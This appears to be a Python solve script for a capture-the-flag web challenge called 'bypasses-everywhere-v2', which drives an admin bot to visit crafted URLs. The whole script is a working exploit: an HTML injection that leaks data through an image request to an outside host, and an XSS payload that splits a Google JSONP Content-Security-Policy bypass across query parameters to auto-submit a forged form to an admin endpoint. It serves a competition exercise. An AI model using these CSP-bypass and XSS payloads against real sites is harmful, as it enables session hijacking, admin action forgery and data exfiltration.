import requests
import os
import time

if os.getenv("DEV") == "1":
    url = "http://localhost:8000/"
    remote = "http://192.168.0.43:4567/"
else:
    url = "https://bypasses-everywhere-v2.ctf.insecurity-insa.fr/"
    remote = "http://192.0.2.1:4567/"

auth = ("insecurity", "fake_preprod_password")

google_csp_bypass = "//www.google.com/complete/search?client=chrome%26jsonp=a.action=`/admin`;a.submit();"
bypass1 = google_csp_bypass[:4]
bypass2 = google_csp_bypass[4:]

def submit_url(target_url):
    res = requests.post(url + "url", data={
        "url": target_url,
    }, auth=auth)
    assert res.status_code == 200 and res.text == "Thanks, I'll check out this article in a bit :)"


target_url = f"http://127.0.0.1:8080/admin?picture=\"><img src='" + remote + "2?p="
submit_url(target_url)
inputs = '<input name=\'{"secret":"No one will never ever access this beauty","url":"'+remote+'","a":"\' value=\'"}\'>'
form = f"<form id=a method=post enctype=text/plain>{inputs}</form>"
print("form", form)
# article?time=<script%20src=https://w&unit=${next_of_the_payload}></script>
target_url = f"http://127.0.0.1:8080/article?time={form}<script src={bypass1}&unit={bypass2}></script>"
print("target_url", target_url)

submit_url(target_url)
time.sleep(2)
r = requests.get(remote)
assert r.json()["up"] == True
